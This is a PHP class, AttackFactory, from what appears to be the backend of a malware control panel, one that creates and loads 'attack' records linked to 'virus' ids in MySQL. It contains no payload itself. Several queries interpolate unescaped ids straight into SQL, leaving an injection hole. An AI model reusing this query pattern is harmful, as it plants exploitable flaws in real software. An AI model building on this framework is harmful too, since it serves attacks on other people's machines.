<?php /** @noinspection PhpUndefinedMethodInspection */


namespace Kelvinho\Virus\Attack;


use Kelvinho\Virus\Ids;
use Kelvinho\Virus\Logs;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Session;
use Kelvinho\Virus\Virus\VirusFactory;
use function Kelvinho\Virus\db;

class AttackFactory {
    private RequestData $requestData;
    private Session $session;
    private VirusFactory $virusFactory;

    public function __construct(RequestData $requestData, Session $session) {
        $this->requestData = $requestData;
        $this->session = $session;
    }

    public function addContext(VirusFactory $virusFactory) {
        $this->virusFactory = $virusFactory;
    }

    /**
     * Get an attack when given an attack id.
     *
     * @param string $attack_id The attack id
     * @return AttackInterface The attack
     */
    public function get(string $attack_id): AttackInterface {
        $mysqli = db();
        if ($mysqli->connect_errno) Logs::mysql($mysqli->connect_error);
        $answer = $mysqli->query("select name, attack_package, virus_id, status, executed_time from attacks where attack_id = \"$attack_id\"");
        $mysqli->close();
        if (!$answer) throw new AttackNotFound();
        $row = $answer->fetch_assoc();
        if (!$row) throw new AttackNotFound();

        $packageDbName = $row["attack_package"];
        if (!PackageRegistrar::hasPackage($packageDbName)) throw new AttackPackageNotFound();
        $classname = PackageRegistrar::getClassName($packageDbName);
        $attack = new $classname();

        $attack->setContext($this->requestData, $this->session, $this->virusFactory, $this);
        $attack->setAttackId($attack_id);
        $attack->setVirusId($row["virus_id"]);
        $attack->setPackageDbName($row["attack_package"]);
        $attack->setName($row["name"]);
        $attack->setStatus($row["status"]);
        $attack->setExecutedTime($row["executed_time"]);
        $attack->loadState();
        return $attack;
    }

    /**
     * Creates a new attack.
     *
     * @param string $virus_id The virus id
     * @param string $attack_package The attack package name
     * @param string $name The attack name
     * @return AttackInterface|null Null if the attack package doesn't exist, AttackInterface if it does
     */
    public function new(string $virus_id, string $attack_package, string $name): AttackInterface {
        if (!PackageRegistrar::hasPackage($attack_package)) throw new AttackPackageNotFound();
        $attack_id = Ids::newAttackId();
        $classname = PackageRegistrar::getClassName($attack_package);

        mkdir(DATA_FILE . "/attacks/$attack_id");
        touch(DATA_FILE . "/attacks/$attack_id/profile.txt");
        touch(DATA_FILE . "/attacks/$attack_id/state.json");

        $attack = new $classname();
        $attack->setContext($this->requestData, $this->session, $this->virusFactory, $this);
        $attack->setAttackId($attack_id);
        $attack->setVirusId($virus_id);
        $attack->setPackageDbName($attack_package);
        $attack->setName($name);

        $mysqli = db();
        if ($mysqli->connect_errno) Logs::mysql($mysqli->connect_error);
        $mysqli->query("insert into attacks (attack_id, virus_id, attack_package, status, name) values (\"$attack_id\", \"$virus_id\", \"$attack_package\", \"" . $attack->getStatus() . "\", \"" . $mysqli->escape_string($name) . "\")");
        $mysqli->close();
        $attack->saveState();
        return $this->get($attack_id);
    }
}